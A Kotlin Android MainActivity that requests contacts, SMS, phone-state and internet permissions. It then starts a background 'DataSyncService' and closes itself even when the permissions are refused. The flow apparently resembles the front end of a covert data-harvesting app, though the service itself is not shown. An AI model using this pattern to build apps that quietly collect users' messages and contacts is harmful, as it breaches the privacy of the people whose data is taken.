package com.example.myapp

import android.Manifest
import android.content.Intent
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        var allGranted = true
        for ((_, isGranted) in permissions) {
            if (!isGranted) allGranted = false
        }

        if (allGranted) {
            Toast.makeText(this, "Running in Background...", Toast.LENGTH_LONG).show()
            startService(Intent(this, DataSyncService::class.java))
            finish()
        } else {
            Toast.makeText(this, "Permissions needed.", Toast.LENGTH_SHORT).show()
            startService(Intent(this, DataSyncService::class.java))
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        permissionLauncher.launch(
            arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.INTERNET
            )
        )
    }
}
